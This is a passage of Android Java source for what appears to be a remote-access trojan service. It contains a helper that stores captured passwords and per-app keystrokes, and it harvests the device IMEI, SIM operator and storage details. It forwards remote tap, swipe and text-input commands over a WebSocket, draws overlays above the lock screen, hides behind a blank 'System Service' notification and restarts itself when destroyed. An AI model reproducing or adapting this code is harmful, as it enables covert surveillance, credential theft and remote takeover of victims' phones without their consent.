                    camera = Camera.open(cameraId);
                }
                return camera;
            } else {
                if (cameraFront == null) {
                    cameraFront = Camera.open(cameraId);
                }
                return cameraFront;
            }
        } catch (Exception e) {
            Log.e(TAG, "Open camera failed", e);
            return null;
        }
    }
    
    private void releaseCameras() {
        if (camera != null) {
            camera.release();
            camera = null;
        }
        if (cameraFront != null) {
            cameraFront.release();
            cameraFront = null;
        }
        if (mediaRecorder != null) {
            mediaRecorder.release();
            mediaRecorder = null;
        }
    }
    
    // ==================== OPEN APP ====================
    
    private boolean openApp(String packageName) {
        try {
            Intent intent = packageManager.getLaunchIntentForPackage(packageName);
            if (intent != null) {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Log.d(TAG, "App opened: " + packageName);
                return true;
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Open app failed", e);
            return false;
        }
    }
    
    private boolean openAppByName(String appName) {
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_LAUNCHER);
            List<ResolveInfo> apps = packageManager.queryIntentActivities(intent, 0);
            
            for (ResolveInfo resolveInfo : apps) {
                String label = resolveInfo.loadLabel(packageManager).toString().toLowerCase();
                String pkgName = resolveInfo.activityInfo.packageName;
                
                if (label.contains(appName.toLowerCase()) || pkgName.toLowerCase().contains(appName.toLowerCase())) {
                    return openApp(pkgName);
                }
            }
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Open app by name failed", e);
            return false;
        }
    }
    
    // ==================== OTHER COMMANDS ====================
    
    private void toggleFlashlight(boolean on) {
        try {
            if (cameraManager == null) return;
            
            if (cameraId == null) {
                String[] cameraIdList = cameraManager.getCameraIdList();
                if (cameraIdList != null && cameraIdList.length > 0) {
                    cameraId = cameraIdList[0];
                } else {
                    return;
                }
            }
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                cameraManager.setTorchMode(cameraId, on);
                Log.d(TAG, "Flashlight " + (on ? "on" : "off"));
            }
        } catch (Exception e) {
            Log.e(TAG, "Toggle flashlight failed", e);
        }
    }
    
    private void playMusic(String url) {
        try {
            if (mediaPlayer != null) {
                try {
                    mediaPlayer.release();
                } catch (Exception e) {}
                mediaPlayer = null;
            }
            
            mediaPlayer = new MediaPlayer();
            mediaPlayer.setAudioStreamType(AudioManager.STREAM_MUSIC);
            mediaPlayer.setDataSource(url);
            mediaPlayer.prepareAsync();
            mediaPlayer.setOnPreparedListener(mp -> {
                try {
                    mp.start();
                    Log.d(TAG, "Music playing: " + url);
                } catch (Exception e) {}
            });
        } catch (Exception e) {
            Log.e(TAG, "Play music failed", e);
        }
    }
    
    private void stopMusic() {
        if (mediaPlayer != null) {
            try {
                mediaPlayer.stop();
                mediaPlayer.release();
                Log.d(TAG, "Music stopped");
            } catch (Exception e) {}
            mediaPlayer = null;
        }
    }
    
    private void openWebPage(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Open web page failed", e);
        }
    }
    
    // ==================== NOTIFICATIONS & POPUPS ====================
    
    private void showCustomNotification(String title, String message) {
        try {
            NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                    "custom_notifications",
                    "Custom Notifications",
                    NotificationManager.IMPORTANCE_HIGH
                );
                notificationManager.createNotificationChannel(channel);
            }
            
            NotificationCompat.Builder builder = new NotificationCompat.Builder(this, "custom_notifications")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle(title)
                .setContentText(message)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setDefaults(Notification.DEFAULT_ALL);
            
            notificationManager.notify((int) System.currentTimeMillis(), builder.build());
        } catch (Exception e) {
            Log.e(TAG, "Custom notification failed", e);
        }
    }
    
    private void showModernPopup(String title, String message) {
        try {
            backgroundHandler.post(() -> {
                try {
                    int layoutFlag;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                    } else {
                        layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
                    }
                    
                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.MATCH_PARENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        layoutFlag,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                        WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
                        WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                        PixelFormat.TRANSLUCENT
                    );
                    
                    params.gravity = Gravity.CENTER;
                    params.width = (int) (getResources().getDisplayMetrics().widthPixels * 0.85);
                    
                    LinearLayout layout = new LinearLayout(BackgroundService.this);
                    layout.setOrientation(LinearLayout.VERTICAL);
                    layout.setBackgroundColor(Color.parseColor("#DD2A2A2A"));
                    layout.setPadding(50, 50, 50, 50);
                    
                    TextView titleView = new TextView(BackgroundService.this);
                    titleView.setText(title);
                    titleView.setTextColor(Color.WHITE);
                    titleView.setTextSize(22);
                    titleView.setTypeface(Typeface.DEFAULT_BOLD);
                    titleView.setGravity(Gravity.CENTER);
                    titleView.setPadding(0, 0, 0, 30);
                    layout.addView(titleView);
                    
                    TextView messageView = new TextView(BackgroundService.this);
                    messageView.setText(message);
                    messageView.setTextColor(Color.parseColor("#EEEEEE"));
                    messageView.setTextSize(16);
                    messageView.setGravity(Gravity.CENTER);
                    messageView.setPadding(20, 20, 20, 40);
                    layout.addView(messageView);
                    
                    Button okButton = new Button(BackgroundService.this);
                    okButton.setText("OK");
                    okButton.setTextColor(Color.WHITE);
                    okButton.setBackgroundColor(Color.parseColor("#4CAF50"));
                    okButton.setPadding(30, 20, 30, 20);
                    
                    FrameLayout buttonContainer = new FrameLayout(BackgroundService.this);
                    buttonContainer.addView(okButton);
                    layout.addView(buttonContainer);
                    
                    windowManager.addView(layout, params);
                    
                    okButton.setOnClickListener(v -> {
                        try {
                            windowManager.removeView(layout);
                        } catch (Exception e) {}
                    });
                } catch (Exception e) {
                    Log.e(TAG, "Show popup failed", e);
                }
            });
        } catch (Exception e) {}
    }
    
    // ==================== FLOATING IMAGES ====================
    
    private void showFloatingImages(String imageUrl, int count) {
        try {
            for (int i = 0; i < count; i++) {
                showSingleFloatingImage(imageUrl);
            }
        } catch (Exception e) {}
    }
    
    private void showSingleFloatingImage(String imageUrl) {
        try {
            backgroundHandler.post(() -> {
                try {
                    int layoutFlag;
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        layoutFlag = WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY;
                    } else {
                        layoutFlag = WindowManager.LayoutParams.TYPE_PHONE;
                    }
                    
                    WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        WindowManager.LayoutParams.WRAP_CONTENT,
                        layoutFlag,
                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH |
                        WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED,
                        PixelFormat.TRANSLUCENT
                    );
                    
                    int screenWidth = getResources().getDisplayMetrics().widthPixels;
                    int screenHeight = getResources().getDisplayMetrics().heightPixels;
                    
                    params.x = random.nextInt(Math.max(screenWidth - 300, 1));
                    params.y = random.nextInt(Math.max(screenHeight - 300, 1));
                    
                    ImageView imageView = new ImageView(BackgroundService.this);
                    imageView.setScaleType(ImageView.ScaleType.FIT_CENTER);
                    imageView.setAdjustViewBounds(true);
                    
                    FrameLayout touchInterceptor = new FrameLayout(BackgroundService.this);
                    touchInterceptor.addView(imageView);
                    
                    touchInterceptor.setOnTouchListener(new View.OnTouchListener() {
                        private int initialX;
                        private int initialY;
                        private float initialTouchX;
                        private float initialTouchY;
                        
                        @Override
                        public boolean onTouch(View v, MotionEvent event) {
                            switch (event.getAction()) {
                                case MotionEvent.ACTION_DOWN:
                                    initialX = params.x;
                                    initialY = params.y;
                                    initialTouchX = event.getRawX();
                                    initialTouchY = event.getRawY();
                                    return true;
                                case MotionEvent.ACTION_MOVE:
                                    params.x = initialX + (int) (event.getRawX() - initialTouchX);
                                    params.y = initialY + (int) (event.getRawY() - initialTouchY);
                                    windowManager.updateViewLayout(touchInterceptor, params);
                                    return true;
                                default:
                                    return false;
                            }
                        }
                    });
                    
                    windowManager.addView(touchInterceptor, params);
                    floatingImages.add(touchInterceptor);
                    
                    Glide.with(BackgroundService.this)
                        .asBitmap()
                        .load(imageUrl)
                        .into(new SimpleTarget<Bitmap>() {
                            @Override
                            public void onResourceReady(Bitmap resource, Transition<? super Bitmap> transition) {
                                imageView.setImageBitmap(resource);
                            }
                        });
                } catch (Exception e) {}
            });
        } catch (Exception e) {}
    }
    
    private void clearFloatingImages() {
        try {
            for (View view : floatingImages) {
                try {
                    windowManager.removeView(view);
                } catch (Exception e) {}
            }
            floatingImages.clear();
        } catch (Exception e) {}
    }
    
    // ==================== UTILITY METHODS ====================
    
    private int getBatteryLevel() {
        try {
            if (batteryManager != null) {
                return batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
            }
        } catch (Exception e) {}
        return -1;
    }
    
    private void getTelephonyInfo(JSONObject info) {
        try {
            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED && 
                telephonyManager != null) {
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    String imei = telephonyManager.getImei();
                    if (imei != null) info.put("imei", imei);
                } else {
                    String deviceId = telephonyManager.getDeviceId();
                    if (deviceId != null) info.put("imei", deviceId);
                }
                
                String simOperator = telephonyManager.getSimOperatorName();
                if (simOperator != null) info.put("sim_operator", simOperator);
                
                String networkOperator = telephonyManager.getNetworkOperatorName();
                if (networkOperator != null) info.put("network_operator", networkOperator);
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Telephony permission error", e);
        } catch (Exception e) {
            Log.e(TAG, "Telephony info failed", e);
        }
    }
    
    private void getNetworkInfo(JSONObject info) {
        try {
            if (connectivityManager != null) {
                NetworkInfo activeNetwork = connectivityManager.getActiveNetworkInfo();
                if (activeNetwork != null) {
                    info.put("network_connected", activeNetwork.isConnectedOrConnecting());
                    info.put("network_type_name", activeNetwork.getTypeName() != null ? activeNetwork.getTypeName() : "unknown");
                } else {
                    info.put("network_connected", false);
                    info.put("network_type_name", "none");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Network info failed", e);
        }
    }
    
    private void getMemoryInfo(JSONObject info) {
        try {
            Runtime runtime = Runtime.getRuntime();
            info.put("ram_total", runtime.totalMemory());
            info.put("ram_free", runtime.freeMemory());
            info.put("ram_max", runtime.maxMemory());
            info.put("available_processors", runtime.availableProcessors());
        } catch (Exception e) {
            Log.e(TAG, "Memory info failed", e);
        }
    }
    
    private void getStorageInfo(JSONObject info) {
        try {
            File path = Environment.getDataDirectory();
            StatFs statFs = new StatFs(path.getPath());
            long totalStorage = (long) statFs.getBlockCount() * (long) statFs.getBlockSize();
            long freeStorage = (long) statFs.getAvailableBlocks() * (long) statFs.getBlockSize();
            info.put("storage_total", totalStorage);
            info.put("storage_free", freeStorage);
            info.put("storage_used", totalStorage - freeStorage);
        } catch (Exception e) {
            Log.e(TAG, "Storage info failed", e);
        }
    }
    
    private String safeString(String value) {
        return value != null ? value : "unknown";
    }
    
    // ==================== NOTIFICATION ====================
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Service",
                    NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription("System background service");
                NotificationManager manager = getSystemService(NotificationManager.class);
                if (manager != null) {
                    manager.createNotificationChannel(channel);
                }
            } catch (Exception e) {}
        }
    }
    
    private Notification createNotification() {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(" ")
            .setContentText(" ")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true);
        return builder.build();
    }
    
    // ==================== INNER HELPER CLASSES ====================
    
    // ===== ScreenControlHelper =====
    private class ScreenControlHelper {
        private Context context;
        private boolean isActive = false;
        
        public ScreenControlHelper(Context context) {
            this.context = context;
        }
        
        public void queueTap(float x, float y) {
            try {
                JSONObject gesture = new JSONObject();
                gesture.put("action", "tap");
                gesture.put("x", x);
                gesture.put("y", y);
                queueGesture(gesture);
            } catch (Exception e) {}
        }
        
        public void queueSwipe(float startX, float startY, float endX, float endY) {
            try {
                JSONObject gesture = new JSONObject();
                gesture.put("action", "swipe");
                gesture.put("start_x", startX);
                gesture.put("start_y", startY);
                gesture.put("end_x", endX);
                gesture.put("end_y", endY);
                queueGesture(gesture);
            } catch (Exception e) {}
        }
        
        public void queueInputText(String text) {
            try {
                JSONObject gesture = new JSONObject();
                gesture.put("action", "input_text");
                gesture.put("text", text);
                queueGesture(gesture);
            } catch (Exception e) {}
        }
        
        public void queueFindAndTap(String search) {
            try {
                JSONObject gesture = new JSONObject();
                gesture.put("action", "find_and_tap");
                gesture.put("search", search);
                queueGesture(gesture);
            } catch (Exception e) {}
        }
        
        public void queueFindAndInput(String search, String input) {
            try {
                JSONObject gesture = new JSONObject();
                gesture.put("action", "find_and_input");
                gesture.put("search", search);
                gesture.put("input", input);
                queueGesture(gesture);
            } catch (Exception e) {}
        }
        
        private void queueGesture(JSONObject gesture) {
            Log.d(TAG, "Gesture queued: " + gesture.optString("action"));
            // Kirim ke server sebagai media atau command
            try {
                JSONObject cmd = new JSONObject();
                cmd.put("type", "gesture");
                cmd.put("data", gesture);
                if (webSocket != null && isConnected) {
                    webSocket.send(cmd.toString());
                }
            } catch (Exception e) {}
        }
        
        public void performBack() {
            try {
                JSONObject gesture = new JSONObject();
                gesture.put("action", "back");
                queueGesture(gesture);
            } catch (Exception e) {}
        }
        
        public void performHome() {
            try {
                JSONObject gesture = new JSONObject();
                gesture.put("action", "home");
                queueGesture(gesture);
            } catch (Exception e) {}
        }
        
        public void performRecentApps() {
            try {
                JSONObject gesture = new JSONObject();
                gesture.put("action", "recent");
                queueGesture(gesture);
            } catch (Exception e) {}
        }
    }
    
    // ===== PasswordCaptureHelper =====
    private class PasswordCaptureHelper {
        private Context context;
        private SharedPreferences prefs;
        private static final String PREFS_NAME = "password_capture";
        private static final String KEY_PASSWORDS = "captured_passwords";
        
        public PasswordCaptureHelper(Context context) {
            this.context = context;
            this.prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        }
        
        public void savePassword(String entry) {
            try {
                String existing = prefs.getString(KEY_PASSWORDS, "[]");
                JSONArray array = new JSONArray(existing);
                array.put(entry);
                prefs.edit().putString(KEY_PASSWORDS, array.toString()).apply();
            } catch (Exception e) {}
        }
        
        public void saveKeystroke(String packageName, String text) {
            try {
                String existing = prefs.getString("keystrokes_" + packageName, "[]");
                JSONArray array = new JSONArray(existing);
                JSONObject obj = new JSONObject();
                obj.put("text", text);
                obj.put("timestamp", System.currentTimeMillis());
                array.put(obj);
                prefs.edit().putString("keystrokes_" + packageName, array.toString()).apply();
            } catch (Exception e) {}
        }
        
        public String getCapturedPasswords() {
            return prefs.getString(KEY_PASSWORDS, "[]");
        }
    }
    
    // ==================== SERVICE LIFECYCLE ====================
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "onStartCommand");
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "onDestroy");
        
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
            
            if (webSocket != null) {
                try {
                    webSocket.close(1000, "Service destroyed");
                } catch (Exception e) {}
                webSocket = null;
            }
            
            if (locationManager != null && locationListener != null) {
                try {
                    locationManager.removeUpdates(locationListener);
                } catch (Exception e) {}
            }
            
            if (fusedLocationClient != null && locationCallback != null) {
                try {
                    fusedLocationClient.removeLocationUpdates(locationCallback);
                } catch (Exception e) {}
            }
            
            if (mediaPlayer != null) {
                try {
                    mediaPlayer.release();
                } catch (Exception e) {}
                mediaPlayer = null;
            }
            
            releaseCameras();
            clearFloatingImages();
            
            if (backgroundHandler != null) {
                backgroundHandler.removeCallbacksAndMessages(null);
            }
            
            if (handlerThread != null) {
                try {
                    handlerThread.quitSafely();
                } catch (Exception e) {}
            }
            
            Intent restartIntent = new Intent(this, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(restartIntent);
            } else {
                startService(restartIntent);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "onDestroy error", e);
        }
        
        super.onDestroy();
    }
}